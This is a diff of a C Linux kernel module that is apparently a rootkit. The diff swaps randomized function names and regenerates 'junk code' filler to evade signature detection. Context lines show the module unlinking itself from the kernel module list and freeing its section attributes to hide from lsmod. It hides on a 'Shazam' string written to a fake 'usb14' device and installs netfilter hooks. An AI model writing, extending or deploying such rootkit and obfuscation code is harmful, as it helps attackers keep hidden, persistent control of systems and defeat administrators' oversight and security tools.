@@ -34,160 +34,160 @@ static struct cdev fake_cdev;
 static char message[128];
 static struct nf_hook_ops netfilter_ops;
 int allowlist[]={80,443,53};
-void fkpjeoyszz7 (void);
-void f6h2545fov0 (void);
+void f6c4190vxo6 (void);
+void fypdihvm50q (void);
 
 /* Junk code generator macros */
-void fx0wyj07r0q (void)
+void fg2rqy0r1mi (void)
 {
-	int counter=0;
-	int x=0,y=0;
-	x*=1;
-	y++;
-	x+=y;
-	x-=1;
-	y-=1;
-	y+=1;
-	x+=2;
-	x+=1;
-	x*=1;
-	x+=1;
-	x+=y;
+	volatile int counter=0;
+	volatile int x=0,y=0;
 	y+=1;
 	y++;
-	x+=2;
-	x-=1;
-	y-=1;
-	y++;
-	x+=y;
-	y-=1;
 	x+=1;
-	x*=1;
-	x-=1;
-	y+=1;
-	x+=2;
-	x*=1;
-	x+=2;
 	y-=1;
-	y++;
+	x*=1;
+	x+=2;
 	x+=y;
 	x-=1;
 	x+=1;
-	y+=1;
 	x+=y;
-	y+=1;
 	y-=1;
-	y++;
+	x*=1;
+	y+=1;
 	x+=2;
+	y++;
+	x-=1;
+	x+=2;
+	y-=1;
+	y+=1;
+	y++;
+	x+=y;
 	x*=1;
 	x+=1;
 	x-=1;
+	x+=y;
+	x+=2;
+	y++;
+	x-=1;
+	x*=1;
+	y+=1;
+	x+=1;
+	y-=1;
+	y-=1;
+	x*=1;
+	x+=1;
+	x+=y;
+	y+=1;
+	x-=1;
+	x+=2;
+	y++;
 
 
 		while(counter!=5)
 		{
-			fkpjeoyszz7();
+			f6c4190vxo6();
 			counter++;
 		}
 }
 
-void fkpjeoyszz7 (void)
+void f6c4190vxo6 (void)
 {
-	int counter=0;
-	int x=0,y=0;
+	volatile int counter=0;
+	volatile int x=0,y=0;
+	x+=1;
+	x+=y;
 	y+=1;
 	x*=1;
-	y++;
-	x+=y;
 	x+=2;
 	y-=1;
 	x-=1;
-	x+=1;
-	x*=1;
-	x-=1;
+	y++;
 	x+=2;
 	y+=1;
-	x+=y;
-	y++;
-	y-=1;
 	x+=1;
-	y-=1;
-	y++;
-	x+=y;
-	x*=1;
-	x+=1;
-	y+=1;
-	x-=1;
-	x+=2;
 	y++;
 	y-=1;
 	x+=y;
 	x*=1;
-	x+=2;
 	x-=1;
-	x+=1;
 	y+=1;
-	x+=y;
-	y+=1;
-	x+=1;
-	x+=2;
-	y-=1;
 	y++;
-	x*=1;
+	y-=1;
+	x+=y;
+	x+=1;
 	x-=1;
+	x+=2;
+	x*=1;
+	x+=1;
+	y+=1;
+	y++;
+	x+=2;
+	x*=1;
+	y-=1;
+	x+=y;
+	x-=1;
+	x+=1;
+	x-=1;
+	x+=2;
+	x*=1;
+	x+=y;
+	y-=1;
+	y+=1;
+	y++;
 
 
 		while(counter!=4)
 		{
-			f6h2545fov0();
+			fypdihvm50q();
 			counter++;
 		}
 }
 
 
-void f6h2545fov0 (void)
+void fypdihvm50q (void)
 {
-	int x=0,y=0;
+	volatile int x=0,y=0;
 	y-=1;
 	y++;
-	x*=1;
+	x+=1;
 	x+=y;
 	x+=2;
-	x+=1;
-	y+=1;
-	x-=1;
-	x+=1;
-	x+=2;
 	x*=1;
-	x+=y;
 	x-=1;
-	y++;
 	y+=1;
-	y-=1;
-	x-=1;
 	x*=1;
-	y++;
+	x+=1;
+	x-=1;
 	x+=y;
 	y-=1;
-	x+=1;
+	y++;
 	y+=1;
 	x+=2;
-	x+=1;
-	x+=y;
 	y++;
 	x+=2;
+	x*=1;
 	x-=1;
 	y+=1;
 	y-=1;
-	x*=1;
-	y-=1;
-	x+=2;
-	x*=1;
 	x+=1;
 	x+=y;
+	x+=2;
+	y-=1;
+	x+=1;
+	x*=1;
+	y++;
+	y+=1;
+	x-=1;
+	x+=y;
+	x+=2;
+	y-=1;
+	x+=1;
+	x*=1;
 	x-=1;
 	y+=1;
 	y++;
+	x+=y;
 
 
 }
@@ -242,14 +242,14 @@ unsigned int filter_port_scans(struct sk_buff *skb)
 
 
 
-void f0nmavftowx(void)
+void f9fjh2kbtla(void)
 {
 	module_previous = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
 	module_hidden = 1;
 }
 
-static inline void f1pqz1bhm9o(void)
+static inline void fyoctg3lz3b(void)
 {
 	kfree(THIS_MODULE->sect_attrs);
 	THIS_MODULE->sect_attrs = NULL;
@@ -292,7 +292,7 @@ ssize_t fake_write(struct file * filp, const char __user * buf, size_t count,
 
 /*	If detect Shazam string in fake device IO turn module invisible to lsmod  */
     		if(strstr(message,"Shazam")!=NULL)
-			f0nmavftowx();
+			f9fjh2kbtla();
 
     	return count;
 }
@@ -589,9 +589,9 @@ int init_module()
     	int error;
     	dev_t devt = 0;
 /*       JUNK CODE gen */
-	fx0wyj07r0q();
-	f0nmavftowx();
-	f1pqz1bhm9o();
+	fg2rqy0r1mi();
+	f9fjh2kbtla();
+	fyoctg3lz3b();
 
     /* Get a range of minor numbers (starting with 0) to work with */
     	error = alloc_chrdev_region(&devt, 0, 1, "usb14");
